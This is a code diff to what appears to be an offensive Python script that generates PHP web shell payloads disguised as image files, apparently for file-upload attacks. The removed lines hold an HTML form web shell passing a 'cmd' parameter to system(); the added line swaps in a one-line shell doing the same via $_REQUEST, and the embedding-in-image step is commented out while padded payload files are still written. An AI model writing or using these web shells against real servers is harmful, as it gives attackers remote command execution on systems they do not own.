@@ -31,22 +31,7 @@ def embed_php_in_image(image_file, output_file):
 def create_payloads():
     """Create PHP web shell payloads (~5.9 KB size) embedded inside images."""
 
-    reverse_shell = """<html>
-    <body>
-    <h1>hi</h1>
-      <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-        <input type="text" name="cmd" autofocus id="cmd" size="80">
-        <input type="submit" value="Execute">
-      </form>
-      <pre>
-  <?php
-    if(isset($_GET['cmd'])) {
-        system($_GET['cmd']);
-    }
-  ?>
-      </pre>
-    </body>
-  </html>"""
+    reverse_shell = "<?php system($_REQUEST['cmd']); ?>"
 
     # ✅ Required Payload Filenames (DO NOT REMOVE)
     payloads = [
@@ -78,7 +63,7 @@ def create_payloads():
                 f.write(reverse_shell + "\n" + padding)
 
             # Embed PHP in metadata to keep image structure valid
-            embed_php_in_image("clean_image.jpg", filename)
+            # embed_php_in_image("clean_image.jpg", filename)
 
             print(f"[+] Created and embedded payload: {filename} ({os.path.getsize(filename)} bytes)")
             created_files.append(filename)
